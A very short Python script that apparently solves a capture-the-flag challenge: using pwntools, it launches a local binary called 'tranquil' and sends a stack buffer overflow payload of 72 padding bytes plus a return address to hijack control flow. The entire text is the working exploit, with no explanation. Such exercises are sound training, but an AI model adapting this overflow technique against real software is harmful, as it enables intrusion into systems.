from pwn import *

p = process(['./tranquil'])
payload = 'A'*72 + '\x96\x11\x40'
p.sendline(payload)
print(p.recvall())
